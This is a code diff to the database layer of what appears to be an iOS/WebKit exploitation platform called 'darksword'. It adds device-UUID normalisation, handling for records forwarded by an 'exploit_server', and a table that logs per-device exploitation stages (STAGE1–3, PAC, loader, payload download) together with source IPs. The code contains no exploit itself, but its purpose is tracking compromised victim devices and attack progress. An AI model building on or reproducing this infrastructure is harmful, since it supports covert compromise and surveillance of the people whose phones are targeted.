@@ -1,3 +1,5 @@
+import hashlib
+
 from sqlalchemy import create_engine, Column, Integer, String, DateTime, Text
 from sqlalchemy.orm import declarative_base, sessionmaker, Session
 from datetime import datetime
@@ -6,6 +8,40 @@ from typing import Optional
 
 PROJECT_ROOT = Path(__file__).resolve().parent.parent
 DATABASE_URL = f"sqlite:///{PROJECT_ROOT / 'darksword.db'}"
+
+
+def normalize_device_uuid(device_uuid: Optional[str], user_agent: Optional[str]) -> Optional[str]:
+    """校正设备 UUID 前缀使其与 UA 一致，避免 PC 浏览器缓存旧 ios- UUID 导致误识别。
+
+    规则：
+    - 空/None：返回 None（由调用方按 UA 生成）
+    - unknown- 前缀：后端兜底生成的临时 UUID，需按 UA 重生成
+    - ios- 前缀但 UA 非 iOS：PC 浏览器缓存了修复前的旧 UUID，重生成 dev-
+    - 无前缀的纯 hex UUID（旧式）：按 UA 补 ios-/dev- 前缀
+    - 前缀与 UA 一致：原样返回
+
+    需要重新生成时使用 UA 的 SHA1 哈希确定性生成，保证同一 PC 始终映射到同一 UUID，
+    避免每次轮询都新建记录导致数据增殖。
+    """
+    if not device_uuid:
+        return None
+    ua = user_agent or ""
+    s = str(device_uuid).strip()
+    if not s:
+        return None
+    is_ios_ua = any(k in ua for k in ("iPhone", "iPad", "iPod", "iOS"))
+    has_ios_prefix = s.startswith("ios-")
+    has_dev_prefix = s.startswith("dev-")
+    has_unknown_prefix = s.startswith("unknown-")
+    # 前缀与 UA 不匹配 -> 确定性重生成
+    if has_unknown_prefix or (has_ios_prefix and not is_ios_ua):
+        h = hashlib.sha1(ua.encode("utf-8", "replace")).hexdigest()[:24]
+        return ("ios-" if is_ios_ua else "dev-") + h
+    # 前缀正确，原样返回
+    if has_ios_prefix or has_dev_prefix:
+        return s
+    # 无前缀的纯 hex（旧式）-> 按 UA 补前缀
+    return ("ios-" if is_ios_ua else "dev-") + s
 
 engine = create_engine(DATABASE_URL, connect_args={"check_same_thread": False})
 SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
@@ -60,6 +96,29 @@ class Device(Base):
     webkit_version = Column(String(50), nullable=True)
     os_type = Column(String(20), nullable=True)
     compatible_level = Column(String(30), nullable=True)
+
+
+def resolve_forwarded_uuid_ua(db: Session, raw_uuid: Optional[str],
+                              payload_ua: Optional[str], header_ua: str) -> tuple:
+    """解析 exploit_server 转发请求里的 device_uuid + UA（共享版，供 report.py / devices.py 复用）。
+
+    exploit_server 的 3 条 async forward 线程把设备数据/报告/注册请求 POST 给后端时，
+    HTTP User-Agent 头固定为 'Exploit-Server/1.0'。若直接用它跑 normalize_device_uuid，
+    会让真实 ios- 设备因「前缀与 UA 不匹配」被确定性重生成 dev- 前缀，从而在设备
+    列表里分裂出一条 IP=127.0.0.1 / UA=Exploit-Server/1.0 的幽灵记录。
+
+    策略：
+    - 若 UUID 已存在（exploit_server 端已用真实 UA 注册过），信任其 UUID 不做前缀校正，
+      并复用其已存的 UA（防止把真实 UA 覆盖成 Exploit-Server/1.0）；
+    - 仅对全新 UUID 做前缀校正（处理 PC 浏览器缓存的旧 ios- / unknown- 兜底 UUID）。
+    """
+    existing = db.query(Device).filter(Device.device_uuid == raw_uuid).first() if raw_uuid else None
+    if existing:
+        ua = payload_ua or existing.user_agent or header_ua
+        return raw_uuid, ua
+    ua = payload_ua or header_ua
+    uuid = normalize_device_uuid(raw_uuid, ua) or raw_uuid
+    return uuid, ua
 
 
 MIN_SUPPORTED_IOS = "13.0"
@@ -270,6 +329,20 @@ class CommandScript(Base):
     use_count = Column(Integer, default=0)
     created_at = Column(DateTime, default=datetime.now)
     updated_at = Column(DateTime, default=datetime.now, onupdate=datetime.now)
+
+
+class DeviceExploitLog(Base):
+    """设备漏洞利用过程中浏览器端上报的细粒度控制台日志（STAGE1/STAGE2/STAGE3/PAC/payload 下载等）"""
+    __tablename__ = "device_exploit_logs"
+    id = Column(Integer, primary_key=True, index=True)
+    device_uuid = Column(String(100), index=True, nullable=False)
+    timestamp = Column(DateTime, default=datetime.now, index=True)
+    level = Column(String(10), default="log", index=True)  # log/warn/error/debug/info
+    phase = Column(String(30), index=True, nullable=True)   # STAGE1/STAGE2/STAGE3/PAC/LOADER/...
+    message = Column(Text)                                   # 完整消息（可能很长）
+    tags_json = Column(Text, nullable=True)                  # 附加标签 JSON（数组）
+    extra_json = Column(Text, nullable=True)                 # 附加信息 JSON（对象）
+    source_ip = Column(String(50), nullable=True)
 
 
 def init_db():
